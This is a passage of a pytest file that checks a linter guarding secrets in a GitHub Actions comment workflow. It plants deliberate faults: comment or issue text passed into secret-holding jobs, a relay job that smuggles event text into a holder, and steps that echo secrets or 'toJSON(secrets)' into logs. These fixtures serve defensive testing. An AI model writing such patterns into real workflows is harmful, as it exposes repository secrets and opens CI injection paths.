    ("an issue title in a step env", "alert", "          CC_HITS:", "          T: ${{ github.event.issue.title }}\n          CC_HITS:", "not on the holder allow-list"),
    ("a computed value in a step env", "minimise", "          CC_HITS:", "          T: ${{ format('{0}', github.event.comment.body) }}\n          CC_HITS:", "not on the holder allow-list"),
    ("another secret read in the minimise env", "minimise", "          CC_HITS:", "          T: ${{ secrets.DEPLOY_KEY }}\n          CC_HITS:", "not on the holder allow-list"),
    ("event text in a job output", "detect", "      hit: ${{ steps.scan.outputs.hit }}", "      hit: ${{ github.event.comment.body }}", "not on the holder allow-list"),
]


@pytest.mark.parametrize(("what", "job", "old", "new", "expect"), [d for d in CC_DEVIATIONS if d[2] is not None])
def test_l2_d_red_on_each_planted_deviation_of_a_comment_workflow_holder(what, job, old, new, expect):
    wf = cc_planted(old, new, job=job)
    found = l2_secret_findings(CC, wf) + l2_findings(CC, wf) + l1_findings(CC, wf)
    assert any(expect in f for f in found), (what, found)
    print("RED L2 (d):", what, "->", [f for f in found if expect in f][0])


def test_l2_d_red_when_the_comment_workflow_gets_a_trigger_its_holders_are_not_named_for():
    wf = cc_planted("on:\n  issue_comment:", "on:\n  workflow_dispatch:\n  issue_comment:")
    found = l2_secret_findings(CC, wf)
    assert sum("the workflow has triggers" in f for f in found) == 3, found  # each of the three holders


@pytest.mark.parametrize("secret", [MINIMISE_SECRET, ALERT_SECRET, OVERLAY_SECRET])
@pytest.mark.parametrize(
    "ref",
    [
        "      - run: echo ${{ secrets.<S> }}",
        "      - run: echo ${{ secrets.<l> }}",
        "      - run: echo ${{ secrets['<S>'] }}",
        "      - run: echo ${{ toJSON(secrets) }}",
    ],
)
def test_l2_d_red_on_an_extra_job_reading_any_of_the_secrets_in_the_comment_workflow_or_another(secret, ref):
    extra = "  extra:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n" + ref.replace("<S>", secret).replace("<l>", secret.lower()) + "\n"
    for rel in (CC, CI, LC):
        found = l2_secret_findings(rel, load_text(public_texts()[rel] + extra))
        assert any("job 'extra'" in f for f in found), (rel, ref, found)
    print("RED L2 (d), an extra job:", ref.strip(), "->", found[0])


def test_l2_d_red_on_a_secret_at_workflow_level_in_the_comment_workflow_for_each_secret():
    for s in SECRETS:
        wf = cc_planted("permissions: {}\n", f"permissions: {{}}\nenv:\n  T: ${{{{ secrets.{s} }}}}\n")
        assert any("a workflow-level key references the secret " + s in f for f in l2_secret_findings(CC, wf)), s


def test_l2_d_red_on_a_holder_given_to_the_wrong_workflow_the_minimise_secret_in_the_leak_check_job():
    wf, _ = mutate(LC, "          LC_OVERLAY_REPO: 740Dave/factlattice-deploy", "          LC_OVERLAY_REPO: 740Dave/factlattice-deploy\n          X: ${{ secrets.COMMENT_MINIMISE_TOKEN }}")
    found = l2_secret_findings(LC, wf)
    assert any("a secret other than its own OVERLAY_READ_TOKEN" in f for f in found), found


def test_the_secret_table_and_the_sdlc_row_agree():
    """The SDLC row names every holder the table lists (a holder added to one and not the other is red)."""
    sdlc = open(os.path.join(ROOT, "SDLC.md"), encoding="utf-8").read() if DEV_REPO else None
    if sdlc is None:
        pytest.skip("SDLC.md is not in the published tree")
    row = next(x for x in sdlc.splitlines() if "[CI-PUBLIC-SECRETS-HAVE-NAMED-HOLDERS]" in x)
    for s in SECRETS:
        assert s in row, s
    for _n, j in HOLDER_SHAPE:
        assert f"`{j}`" in row, j


# ---------------------------------------------------------------------------------------------------------------------------------- the relay probe (a helper job that carries event text into a holder)
RELAY_JOB = "  relay:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    outputs:\n      b: ${{ github.event.comment.body }}\n    steps:\n      - run: echo hi\n"


def relay_planted(holder, key, reader, extra_job=RELAY_JOB):
    """The comment workflow with a helper job added and `holder`'s `key` env entry reading `reader` instead of the detect job's output."""
    text = cc_text()
    start = text.index(f"\n  {holder}:\n")
    old = f"          {key}: ${{{{ needs.detect.outputs.hits }}}}"
    at = text.index(old, start)
    text = text[:at] + f"          {key}: ${{{{ {reader} }}}}" + text[at + len(old) :]
    return load_text(text + "\n" + extra_job)


@pytest.mark.parametrize("holder", ["minimise", "alert"])
def test_l2_d_red_on_a_relay_job_that_copies_event_text_into_a_holders_environment(holder):
    """The review's probe: a helper job whose `outputs:` copy the comment body, read by a holder's `env:` as `needs.relay.outputs.b`. It is red because `relay` is not a holder job of this workflow."""
    wf = relay_planted(holder, "CC_HITS", "needs.relay.outputs.b")
    found = l2_secret_findings(CC, wf)
    assert any(f"holder {holder!r}" in f and "needs.relay.outputs.b" in f and "allow-list" in f for f in found), found
    print("RED L2 (d), the relay probe:", [f for f in found if "relay" in f][0])


def test_l2_d_red_on_a_relay_job_that_hides_behind_a_script_output_lookalike_and_on_a_holder_whose_outputs_are_not_script_outputs():
    # a non-holder job whose outputs look like step outputs of a step that runs no staged script
    job = "  relay:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    outputs:\n      b: ${{ steps.s.outputs.b }}\n    steps:\n      - id: s\n        run: echo b=$X >> $GITHUB_OUTPUT\n        env:\n          X: ${{ github.event.comment.body }}\n"
    wf = relay_planted("minimise", "CC_HITS", "needs.relay.outputs.b", job)
    assert any("needs.relay.outputs.b" in f and "allow-list" in f for f in l2_secret_findings(CC, wf))
    # a holder job that exports event text in its own outputs: the holder is named, but its outputs are not script outputs
    wf = cc_planted("      hits: ${{ steps.scan.outputs.hits }}", "      hits: ${{ github.event.comment.body }}")
    assert any("holder 'detect'" in f and "`outputs:`" in f for f in l2_secret_findings(CC, wf))
    wf = cc_planted("      hits: ${{ steps.scan.outputs.hits }}", "      hits: ${{ steps.other.outputs.hits }}")
    assert any("holder 'detect'" in f and "`outputs:`" in f for f in l2_secret_findings(CC, wf))
